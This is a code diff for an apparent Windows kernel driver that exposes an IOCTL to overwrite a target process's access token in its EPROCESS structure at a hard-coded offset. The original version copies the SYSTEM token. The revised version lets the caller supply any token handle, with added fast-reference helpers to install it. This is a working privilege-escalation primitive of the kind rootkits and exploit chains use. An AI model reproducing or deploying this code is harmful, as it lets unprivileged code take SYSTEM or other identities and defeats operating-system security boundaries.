@@ -10,6 +10,12 @@ NTKERNELAPI PVOID PsGetProcessSectionBaseAddress(__in PEPROCESS Process);
 UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\Tokenizer");
 UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\Tokenizer");
 
+struct IoControlParam {
+    DWORD SourcePid;
+    DWORD TargetPid;
+    HANDLE SourceToken;
+};
+
 NTSTATUS NTAPI MmCopyVirtualMemory
 (
     PEPROCESS SourceProcess,
@@ -22,19 +28,128 @@ NTSTATUS NTAPI MmCopyVirtualMemory
 );
 char* PsGetProcessImageFileName(PEPROCESS Process);
 
+#define MAX_FAST_REFS 7
+
+//
+// Executive Fast Reference Structure
+//
+typedef struct _EX_FAST_REF
+{
+    union
+    {
+        PVOID Object;
+        ULONG_PTR RefCnt : 3;
+        ULONG_PTR Value;
+    };
+} EX_FAST_REF, * PEX_FAST_REF;
+
+void FASTCALL ObReferenceObjectEx(LPVOID Object, int Count)
+{
+    while (Count--) {
+        ObReferenceObject(Object);
+    }
+}
+
+void FASTCALL ObDereferenceObjectEx(LPVOID Object, int Count)
+{
+    while (Count--) {
+        ObDereferenceObject(Object);
+    }
+}
+
+FORCEINLINE
+EX_FAST_REF
+ExSwapFastReference(IN PEX_FAST_REF FastRef,
+    IN PVOID Object)
+{
+    EX_FAST_REF NewValue, OldValue;
+
+    /* Sanity check */
+    ASSERT((((ULONG_PTR)Object) & MAX_FAST_REFS) == 0);
+
+    /* Check if an object is being set */
+    if (!Object)
+    {
+        /* Clear the field */
+        NewValue.Object = NULL;
+    }
+    else
+    {
+        /* Otherwise, we assume the object was referenced and is ready */
+        NewValue.Value = (ULONG_PTR)Object | MAX_FAST_REFS;
+    }
+
+    /* Update the object */
+    OldValue.Object = InterlockedExchangePointer(&FastRef->Object, NewValue.Object);
+    return OldValue;
+}
+
+/* FAST REFS ******************************************************************/
+
+FORCEINLINE
+PVOID
+ExGetObjectFastReference(IN EX_FAST_REF FastRef)
+{
+    /* Return the unbiased pointer */
+    return (PVOID)(FastRef.Value & ~MAX_FAST_REFS);
+}
+
+FORCEINLINE
+ULONG
+ExGetCountFastReference(IN EX_FAST_REF FastRef)
+{
+    /* Return the reference count */
+    return (ULONG)FastRef.RefCnt;
+}
+
+PVOID
+FASTCALL
+ObFastReplaceObject(IN PEX_FAST_REF FastRef,
+    PVOID Object)
+{
+    EX_FAST_REF OldValue;
+    PVOID OldObject;
+    ULONG Count;
+
+    /* Check if we were given an object and reference it 7 times */
+    if (Object) ObReferenceObjectEx(Object, MAX_FAST_REFS);
+
+    /* Do the swap */
+    OldValue = ExSwapFastReference(FastRef, Object);
+    OldObject = ExGetObjectFastReference(OldValue);
+
+    /* Check if we had an active object and dereference it */
+    Count = ExGetCountFastReference(OldValue);
+    if ((OldObject) && (Count)) ObDereferenceObjectEx(OldObject, Count);
+
+    /* Return the old object */
+    return OldObject;
+}
+
+//void GetAccessTokenFromPid(int Pid)
+//{
+//    PVOID process = NULL;
+//    PsLookupProcessByProcessId((HANDLE)Pid, &process);
+//    PsReferencePrimaryToken(process);
+//    ObDereferenceObject(process);
+//}
+
 int
 ParseAndReplaceEProcessToken(
-    int pid
+    int SourcePid,
+    int TargetPid,
+    HANDLE SourceToken
 )
 {
     PVOID process = NULL;
-    PVOID sys = NULL;
+    //PVOID sys = NULL;
     PACCESS_TOKEN TargetToken;
-    PACCESS_TOKEN sysToken;
+    //PACCESS_TOKEN sysToken;
+    PACCESS_TOKEN AccessToken = NULL;
     __try
     {
 
-        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);
+        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)TargetPid, &process);
         if (ret != STATUS_SUCCESS)
         {
             if (ret == STATUS_INVALID_PARAMETER)
@@ -47,43 +162,55 @@ ParseAndReplaceEProcessToken(
             }
             return (-1);
         }
-        PsLookupProcessByProcessId((HANDLE)0x4, &sys); // system process
+        //PsLookupProcessByProcessId((HANDLE)SourcePid, &sys); // system process
+        //if (ret != STATUS_SUCCESS)
+        //{
+        //    if (ret == STATUS_INVALID_PARAMETER)
+        //    {
+        //        DbgPrint("system process ID was not found.");
+        //    }
+        //    if (ret == STATUS_INVALID_CID)
+        //    {
+        //        DbgPrint("the system ID is not valid.");
+        //    }
+        //    ObDereferenceObject(process);
+        //    return (-1);
+        //}
+        char* ImageName;
 
+        ret = ObReferenceObjectByHandle(SourceToken, TOKEN_ASSIGN_PRIMARY, *SeTokenObjectType, ExGetPreviousMode(), (PVOID*)&AccessToken, NULL);
         if (ret != STATUS_SUCCESS)
         {
-            if (ret == STATUS_INVALID_PARAMETER)
-            {
-                DbgPrint("system process ID was not found.");
-            }
-            if (ret == STATUS_INVALID_CID)
-            {
-                DbgPrint("the system ID is not valid.");
-            }
+            DbgPrint("ObReferenceObjectByHandle failed: %x\n", ret);
             ObDereferenceObject(process);
             return (-1);
         }
-        char* ImageName;
+        EX_FAST_REF NewValue = { 0 };
+        ObReferenceObjectEx(AccessToken, MAX_FAST_REFS);
+        NewValue.Value = (ULONG_PTR)AccessToken | MAX_FAST_REFS;
 
         DbgPrint("target process image name : %s \n", ImageName = PsGetProcessImageFileName((PEPROCESS)process));
 
         TargetToken = PsReferencePrimaryToken(process);
         if (!TargetToken)
         {
-            ObDereferenceObject(sys);
+            ObDereferenceObject(AccessToken);
+            //ObDereferenceObject(sys);
             ObDereferenceObject(process);
             return (-1);
         }
         DbgPrint("%s token : %x\n", ImageName, TargetToken);
 
-        sysToken = PsReferencePrimaryToken(sys);
-        if (!sysToken)
-        {
-            ObDereferenceObject(sys);
-            ObDereferenceObject(TargetToken);
-            ObDereferenceObject(process);
-            return (-1);
-        }
-        DbgPrint("system token : %x\n", sysToken);
+        //sysToken = PsReferencePrimaryToken(sys);
+        //if (!sysToken)
+        //{
+        //    ObDereferenceObject(AccessToken);
+        //    ObDereferenceObject(sys);
+        //    ObDereferenceObject(TargetToken);
+        //    ObDereferenceObject(process);
+        //    return (-1);
+        //}
+        //DbgPrint("system token : %x\n", sysToken);
 
         ULONG_PTR UniqueProcessIdAddress = (ULONG_PTR)process + 0x4b8;
 
@@ -92,13 +219,13 @@ ParseAndReplaceEProcessToken(
         unsigned long long  UniqueProcessId = *(PHANDLE)UniqueProcessIdAddress;
 
 
-        ULONG_PTR sysadd = (ULONG_PTR)sys + 0x4b8;
+        //ULONG_PTR sysadd = (ULONG_PTR)sys + 0x4b8;
 
-        DbgPrint("system token address : %x\n", sysadd);
+        //DbgPrint("system token address : %x\n", sysadd);
 
-        unsigned long long  usysid = *(PHANDLE)sysadd;
+        //unsigned long long  usysid = *(PHANDLE)sysadd;
 
-        *(PHANDLE)UniqueProcessIdAddress = *(PHANDLE)sysadd;
+        *(PHANDLE)UniqueProcessIdAddress = NewValue.Object;
 
         DbgPrint("process %s Token updated to  :%x ", ImageName, *(PHANDLE)(UniqueProcessIdAddress));
 
@@ -115,9 +242,10 @@ ParseAndReplaceEProcessToken(
         return (-1);
     }
 
-    ObDereferenceObject(sys);
+    //ObDereferenceObject(AccessToken);
+    //ObDereferenceObject(sys);
     ObDereferenceObject(TargetToken);
-    ObDereferenceObject(sysToken);
+    //ObDereferenceObject(sysToken);
     ObDereferenceObject(process);
     return (0);
 }
@@ -142,13 +270,12 @@ NTSTATUS processIoctlRequest(
     int pstatus = 0;
     if (pstack->Parameters.DeviceIoControl.IoControlCode == ppid)
     {
-        int inputInt = 0;
+        struct IoControlParam Param;
+        RtlCopyMemory(&Param, Irp->AssociatedIrp.SystemBuffer, sizeof(Param));
 
-        RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
+        pstatus = ParseAndReplaceEProcessToken(Param.SourcePid, Param.TargetPid, Param.SourceToken);
 
-        pstatus = ParseAndReplaceEProcessToken(inputInt);
-
-        DbgPrint("Received input value: %d\n", inputInt);
+        DbgPrint("Received source pid: %d, target pid: %d\n", Param.SourcePid, Param.TargetPid);
     }
     memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));
     Irp->IoStatus.Status = 0;
